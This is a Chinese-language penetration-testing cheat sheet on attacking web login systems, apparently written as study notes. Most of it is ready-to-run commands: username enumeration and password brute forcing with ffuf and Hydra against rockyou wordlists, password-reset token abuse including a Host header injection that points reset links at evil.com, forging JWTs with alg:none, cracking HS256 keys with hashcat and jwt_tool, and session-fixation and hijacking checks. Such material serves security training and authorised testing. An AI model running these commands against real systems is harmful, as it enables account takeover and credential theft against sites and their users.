## 理論基礎：認證攻擊面分類

| 攻擊類型 | 目標 | 條件 |
|----------|------|------|
| 帳號枚舉 | 確認哪些帳號存在 | 回應差異（訊息/大小/時間）|
| 暴力破解 | 猜測密碼 | 無速率限制/帳號鎖定 |
| 流程跳步 | 跳過驗證步驟 | 後端不驗證前一步驟完成 |
| 密碼重設 | 接管帳號 | Token 可預測/無綁定/重複使用 |
| Session 操控 | 劫持登入狀態 | Cookie 無 HttpOnly/可預測 |
| JWT 攻擊 | 偽造 Token | alg:none / 弱密鑰 / kid 注入 |
| MFA 旁路 | 跳過二步驗證 | 流程無綁定前一步 |

## 方法一：帳號枚舉

```bash
# 比對存在 vs 不存在帳號的回應差異
curl -s -d "username=admin&password=wrong" http://TARGET/login | grep -i "password\|user\|invalid"
curl -s -d "username=notexist&password=wrong" http://TARGET/login | grep -i "password\|user\|invalid"
# 若訊息不同（"Invalid password" vs "User not found"）→ 可枚舉

# 用 ffuf 枚舉帳號（比對回應大小）
ffuf -w /usr/share/seclists/Usernames/Names/names.txt \
  -u http://TARGET/login \
  -X POST \
  -d "username=FUZZ&password=wrongpass" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fs BASELINE_SIZE
# -fs BASELINE_SIZE → 先用不存在帳號取得基準大小，再過濾

# 時間差枚舉（timing-based）
# 若存在帳號的回應比不存在帳號慢（後端做密碼 hash 比對）
# 需要工具：time curl -s -d "username=admin&password=x" http://TARGET/login
```

## 方法二：Web 登入爆破

```bash
# Hydra HTTP POST 表單
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET_IP http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid credentials"
# /login → 登入 URL 路徑
# username=^USER^&password=^PASS^ → POST 參數（佔位符）
# F=Invalid credentials → 失敗時頁面包含的字串

# 若失敗訊息在 Header（302 重定向）
hydra -l admin -P rockyou.txt TARGET_IP http-post-form \
  "/login:user=^USER^&pass=^PASS^:S=dashboard"
# S=dashboard → 成功時頁面包含 "dashboard"（S=成功特徵）

# 帶 CSRF Token 的登入（需先抓 token）
# 方式：用 Burp Macros 或自訂 script 每次重取 token

# ffuf 做登入爆破（單使用者，多密碼）
ffuf -w /usr/share/wordlists/rockyou.txt \
  -u http://TARGET/login \
  -X POST \
  -d "username=admin&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fc 200 -mc 302
# -fc 200 → 過濾 200（失敗通常留在登入頁）
# -mc 302 → 只顯示 302（成功通常重定向）

# HTTP Basic Auth 爆破
hydra -l admin -P rockyou.txt TARGET_IP http-get /admin
# http-get → GET 請求（帶 Basic Auth）
# /admin → 需要 Basic Auth 的路徑
```

## 方法三：密碼重設邏輯分析

```bash
# 步驟 1：觸發重設請求
curl -s -X POST http://TARGET/forgot-password \
  -d "email=victim@target.com" -v

# 觀察回應中的 reset token 是否可預測
# 常見問題：
# - Token 是 MD5(email + timestamp)
# - Token 是序號（1001、1002...）
# - Token 很短（4-6 位數字）

# 步驟 2：測試 Token 是否有綁定帳號
# 用自己帳號取得的 token，嘗試重設別人的密碼
curl -X POST http://TARGET/reset-password \
  -d "token=MY_TOKEN&email=victim@target.com&new_password=hacked"
# 若成功 → token 未綁定帳號

# 步驟 3：測試 Token 重複使用
curl -X POST http://TARGET/reset-password \
  -d "token=USED_TOKEN&new_password=test123"
# 若成功 → token 沒有一次性限制

# 步驟 4：Host Header 注入（重設 Email 接管）
curl -X POST http://TARGET/forgot-password \
  -H "Host: evil.com" \
  -d "email=victim@target.com"
# 若重設 Email 的連結包含 Host header → 連結指向 evil.com
# 攻擊者可接收點擊後的 token
```

## 方法四：JWT 分析與攻擊

```bash
# 解碼 JWT（base64 decode，無需金鑰）
echo "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xxx" | \
  python3 -c "import sys,base64,json; parts=sys.stdin.read().strip().split('.'); \
  print(json.dumps(json.loads(base64.b64decode(parts[1]+'==')), indent=2))"
# 或用線上工具：jwt.io

# 攻擊 1：alg:none（移除簽名驗證）
# Header 改為：{"alg":"none"}
# 移除 signature 部分
python3 -c "
import base64, json
header = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({'user':'admin','role':'admin'}).encode()).decode().rstrip('=')
print(f'{header}.{payload}.')
"
# 若後端接受 alg:none → 可偽造任何 payload

# 攻擊 2：弱密鑰爆破（HS256）
hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt
# -m 16500 → JWT HS256 模式
# 若找到密鑰 → 可偽造任何 JWT

# 攻擊 3：RS256 改 HS256（演算法混淆）
# 若後端支援兩種演算法，可將 RS256 改為 HS256
# 用 RS 公鑰（可公開取得）作為 HS256 密鑰簽名

# jwt_tool（自動化 JWT 攻擊）
python3 jwt_tool.py JWT_TOKEN -T           # 篡改 payload
python3 jwt_tool.py JWT_TOKEN -X a         # 測試 alg:none
python3 jwt_tool.py JWT_TOKEN -C -d rockyou.txt  # 爆破密鑰
```

## 方法五：Session 分析

```bash
# 分析 Session Cookie 特性
curl -c cookies.txt http://TARGET/login -d "user=test&pass=test"
cat cookies.txt
# 看 Cookie 名稱、值、Flags
# HttpOnly → JS 無法讀取
# Secure → 只 HTTPS 傳
# SameSite → CSRF 保護

# 測試 Session 固定（Session Fixation）
# 1. 在未登入前取得 Session ID
curl -c pre_session.txt http://TARGET/login -I
# 2. 登入後看 Session ID 是否改變
curl -b pre_session.txt -c post_session.txt http://TARGET/login -d "user=a&pass=b"
# 若登入前後 Session ID 相同 → Session Fixation

# 測試 Session 是否驗證其他維度
curl -b "session=VICTIM_SESSION" -H "X-Forwarded-For: VICTIM_IP" http://TARGET/profile
# 若 session 沒有綁定 IP 或 User-Agent → 可能被竊取後仍然有效
```
